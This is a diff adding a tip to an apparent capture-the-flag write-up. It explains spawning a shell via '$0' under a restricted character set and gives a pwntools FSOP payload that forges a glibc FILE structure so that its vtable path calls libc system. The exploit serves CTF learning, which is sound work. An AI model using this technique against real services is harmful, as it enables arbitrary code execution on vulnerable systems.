@@ -113,3 +113,23 @@ p.sendline(payload)
 p.interactive()
 ```
 
+== Tips: Spawn shell
+With the restricted character set 0145adepqtuADEPQTU!\$%\@\`, the most effective way to spawn a shell is using the variable \$0.
+
+In Unix-like shells (bash, sh, zsh, etc.), \$0 expands to the name of the current shell or script (e.g., bash, sh, /bin/bash). Executing it spawns a new instance of that shell.
+
+```python
+...
+payload = flat(
+    {
+        0x00: b"$0",                    # Password string for rdi
+        0x58: fp_addr,                          # Acts as _wide_vtable pointer
+        0x68: libc.sym.system,             # _chain / doallocate target function
+        0x88: fp_addr - 0x10,                   # _lock (must be writable)
+        0xA0: fp_addr - 0x88,                   # _wide_data (shifted alignment)
+        0xD8: libc.sym._IO_wfile_jumps - 0x20,  # vtable -> targets _IO_wfile_overflow
+    },
+    filler=b"\x00",
+)
+...
+```
